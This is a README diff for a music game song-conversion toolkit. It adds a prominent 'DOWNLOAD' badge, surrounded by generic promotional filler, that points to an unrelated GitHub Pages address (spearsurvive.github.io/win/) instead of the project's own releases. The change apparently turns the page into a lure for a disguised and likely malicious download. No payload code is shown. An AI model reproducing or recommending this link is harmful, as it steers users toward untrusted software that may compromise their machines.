@@ -30,6 +30,12 @@ Onyx is a powerful toolkit for converting, authoring, and managing songs across 
 
 Whether you're a newcomer or a veteran, Onyx Music Game Toolkit provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Onyx Music Game Toolkit](https://img.shields.io/badge/⬇_DOWNLOAD_Onyx+Music+Game+Toolkit-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
